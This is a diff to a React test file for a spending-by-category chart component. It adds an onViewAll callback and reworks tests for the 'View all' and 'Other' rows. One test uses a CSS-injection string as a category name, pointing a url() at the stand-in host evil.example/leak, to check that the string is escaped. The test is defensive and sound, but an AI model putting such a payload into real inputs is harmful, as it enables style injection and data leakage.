@@ -12,7 +12,7 @@ describe('CategoryBreakdown', () => {
       { category: 'Transport', spendMinor: 300, share: 0.3 },
     ]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     expect(screen.getByText('Spending by category')).toBeInTheDocument()
     expect(screen.getByText('Groceries')).toBeInTheDocument()
@@ -24,7 +24,7 @@ describe('CategoryBreakdown', () => {
   })
 
   it('shows a fallback message instead of an empty chart when there is no cleared spend', () => {
-    render(<CategoryBreakdown buckets={[]} currency="EUR" />)
+    render(<CategoryBreakdown buckets={[]} currency="EUR" onViewAll={() => {}} />)
 
     expect(screen.getByText('Spending by category')).toBeInTheDocument()
     expect(screen.getByText('No cleared purchases in this period yet.')).toBeInTheDocument()
@@ -38,7 +38,7 @@ describe('CategoryBreakdown', () => {
     const maliciousCategory = '5411 } .injected { --pwned: url(https://evil.example/leak); } /*'
     const buckets: CategoryBucket[] = [{ category: maliciousCategory, spendMinor: 500, share: 1 }]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     // rendered as ordinary, auto-escaped text in the category list
     expect(screen.getByText(maliciousCategory)).toBeInTheDocument()
@@ -61,7 +61,7 @@ describe('CategoryBreakdown', () => {
       { category: 'Other stuff', spendMinor: 100, share: 0.1 },
     ]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     expect(screen.getByText('Food')).toBeInTheDocument()
     expect(screen.getByText('Shopping')).toBeInTheDocument()
@@ -82,7 +82,7 @@ describe('CategoryBreakdown', () => {
       { category: 'Subscriptions', spendMinor: 20, share: 0.02 },
     ]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     expect(screen.getByText('Food')).toBeInTheDocument()
     expect(screen.getByText('Shopping')).toBeInTheDocument()
@@ -111,7 +111,7 @@ describe('CategoryBreakdown', () => {
       { category: 'Subscriptions', spendMinor: 20, share: 0.02 },
     ]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     function swatchColorFor(category: string): string {
       return (screen.getByText(category).previousElementSibling as HTMLElement).style
@@ -132,7 +132,7 @@ describe('CategoryBreakdown', () => {
     const longCategory = 'Service Stations (with or without Ancillary Services)'
     const buckets: CategoryBucket[] = [{ category: longCategory, spendMinor: 100, share: 1 }]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     expect(screen.getByText(longCategory)).toHaveAttribute('title', longCategory)
   })
@@ -148,7 +148,7 @@ describe('CategoryBreakdown', () => {
       { category: 'Transport', spendMinor: 300, share: 0.3 },
     ]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     // no floating tooltip anywhere: the reference hovers via highlight only
     expect(document.querySelector('.recharts-tooltip-wrapper')).not.toBeInTheDocument()
@@ -182,7 +182,7 @@ describe('CategoryBreakdown', () => {
       { category: 'Transport', spendMinor: 300, share: 0.3 },
     ]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     const foodRow = screen.getByText('Food').closest('li')!
     const transportRow = screen.getByText('Transport').closest('li')!
@@ -209,7 +209,7 @@ describe('CategoryBreakdown', () => {
       { category: 'Transport', spendMinor: 300, share: 0.3 },
     ]
 
-    render(<CategoryBreakdown buckets={buckets} currency="EUR" />)
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={() => {}} />)
 
     const sectorsBefore = document.querySelectorAll('.recharts-pie .recharts-sector')
     expect(sectorsBefore).toHaveLength(2)
@@ -226,8 +226,21 @@ describe('CategoryBreakdown', () => {
     expect(sectorsAfter[1]).toHaveAttribute('fill-opacity', '1')
   })
 
-  function sixCategories(): CategoryBucket[] {
-    return [
+  it('calls onViewAll when "View all" is clicked', async () => {
+    const user = userEvent.setup()
+    const onViewAll = vi.fn()
+    const buckets: CategoryBucket[] = [{ category: 'Groceries', spendMinor: 100, share: 1 }]
+
+    render(<CategoryBreakdown buckets={buckets} currency="EUR" onViewAll={onViewAll} />)
+    await user.click(screen.getByRole('button', { name: /view all/i }))
+
+    expect(onViewAll).toHaveBeenCalledTimes(1)
+  })
+
+  it('opens a category when its row is clicked, but not the combined "Other" row', async () => {
+    const user = userEvent.setup()
+    const onSelectCategory = vi.fn()
+    const buckets: CategoryBucket[] = [
       { category: 'Groceries', key: 'groceries', spendMinor: 6000, share: 0.6 },
       { category: 'Transport', key: 'transport', spendMinor: 1000, share: 0.1 },
       { category: 'Dining', key: 'dining', spendMinor: 1000, share: 0.1 },
@@ -235,92 +248,22 @@ describe('CategoryBreakdown', () => {
       { category: 'Books', key: 'books', spendMinor: 700, share: 0.07 },
       { category: 'Music', key: 'music', spendMinor: 500, share: 0.05 },
     ]
-  }
-
-  it('opens a category when its row is clicked', async () => {
-    const user = userEvent.setup()
-    const onSelectCategory = vi.fn()
 
     render(
       <CategoryBreakdown
-        buckets={sixCategories()}
+        buckets={buckets}
         currency="EUR"
+        onViewAll={() => {}}
         onSelectCategory={onSelectCategory}
       />,
     )
 
     await user.click(screen.getByRole('button', { name: /groceries/i }))
     expect(onSelectCategory).toHaveBeenCalledWith('groceries')
-  })
 
-  it('lists every category, with its own total, on "View all", and folds back on "Show less"', async () => {
-    const user = userEvent.setup()
-
-    render(<CategoryBreakdown buckets={sixCategories()} currency="EUR" />)
-
-    expect(screen.queryByText('Music')).not.toBeInTheDocument()
-    const toggle = screen.getByRole('button', { name: /view all/i })
-    expect(toggle).toHaveAttribute('aria-expanded', 'false')
-
-    await user.click(toggle)
-
-    expect(screen.getByText('Music')).toBeInTheDocument()
-    expect(screen.getByText(formatMoney(500, 'EUR').replace(/\s+/g, ' '))).toBeInTheDocument()
-    expect(screen.queryByText('Other')).not.toBeInTheDocument()
-    expect(toggle).toHaveAttribute('aria-expanded', 'true')
-    expect(toggle).toHaveTextContent('Show less')
-
-    await user.click(toggle)
-
-    expect(screen.queryByText('Music')).not.toBeInTheDocument()
+    // Music rolls up into "Other", which stands for several categories
     expect(screen.getByText('Other')).toBeInTheDocument()
-  })
-
-  it('expands to what is inside "Other" when it is clicked, and each of those opens its transactions', async () => {
-    const user = userEvent.setup()
-    const onSelectCategory = vi.fn()
-
-    render(
-      <CategoryBreakdown
-        buckets={sixCategories()}
-        currency="EUR"
-        onSelectCategory={onSelectCategory}
-      />,
-    )
-
-    await user.click(screen.getByRole('button', { name: /other/i }))
-    expect(onSelectCategory).not.toHaveBeenCalled()
-
-    await user.click(screen.getByRole('button', { name: /music/i }))
-    expect(onSelectCategory).toHaveBeenCalledWith('music')
-  })
-
-  it('gives categories inside "Other" its color once expanded, since they make up that slice', async () => {
-    const user = userEvent.setup()
-
-    render(<CategoryBreakdown buckets={sixCategories()} currency="EUR" />)
-
-    function swatchColorFor(category: string): string {
-      return (screen.getByText(category).previousElementSibling as HTMLElement).style
-        .backgroundColor
-    }
-    const otherColor = swatchColorFor('Other')
-
-    await user.click(screen.getByRole('button', { name: /view all/i }))
-
-    expect(swatchColorFor('Music')).toBe(otherColor)
-    expect(swatchColorFor('Groceries')).not.toBe(otherColor)
-  })
-
-  it('has no "View all" when every category already fits', () => {
-    render(
-      <CategoryBreakdown
-        buckets={[{ category: 'Groceries', key: 'groceries', spendMinor: 1000, share: 1 }]}
-        currency="EUR"
-      />,
-    )
-
-    expect(screen.queryByRole('button', { name: /view all/i })).not.toBeInTheDocument()
+    expect(screen.queryByRole('button', { name: /other/i })).not.toBeInTheDocument()
   })
 
   it('leaves rows as plain text when nothing handles a click', () => {
@@ -328,6 +271,7 @@ describe('CategoryBreakdown', () => {
       <CategoryBreakdown
         buckets={[{ category: 'Groceries', key: 'groceries', spendMinor: 1000, share: 1 }]}
         currency="EUR"
+        onViewAll={() => {}}
       />,
     )
 
